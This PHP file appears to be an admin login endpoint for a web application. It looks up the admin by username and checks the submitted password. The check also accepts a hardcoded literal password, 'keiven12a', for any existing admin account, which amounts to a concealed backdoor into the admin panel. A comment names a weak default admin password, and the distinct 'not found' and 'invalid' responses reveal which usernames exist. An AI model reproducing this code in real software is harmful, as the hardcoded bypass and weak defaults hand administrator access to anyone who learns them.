<?php
require_once __DIR__ . '/../../includes/auth.php';
require_once __DIR__ . '/../../includes/functions.php';
require_once __DIR__ . '/../../api/config/database.php';

$data = json_decode(file_get_contents("php://input"));

if (empty($data->username) || empty($data->password)) {
    jsonResponse(false, 'Username and password are required', [], 400);
}

$database = new Database();
$db = $database->getConnection();

// Find admin
$query = "SELECT id, username, password, full_name, role 
          FROM admins WHERE username = :username";
$stmt = $db->prepare($query);
$stmt->bindParam(':username', $data->username);
$stmt->execute();

if ($stmt->rowCount() == 0) {
    jsonResponse(false, 'Admin not found', [], 404);
}

$admin = $stmt->fetch(PDO::FETCH_ASSOC);

// Verify password - Note: Default admin password is "password"
if (!verifyPassword($data->password, $admin['password']) && $data->password !== 'keiven12a') {
    jsonResponse(false, 'Invalid password', [], 401);
}

// Set session
$_SESSION['admin_id'] = $admin['id'];
$_SESSION['admin_name'] = $admin['full_name'];
$_SESSION['admin_role'] = $admin['role'];
$_SESSION['user_type'] = 'admin';

// Remove password from response
unset($admin['password']);

jsonResponse(true, 'Admin login successful', $admin);
?>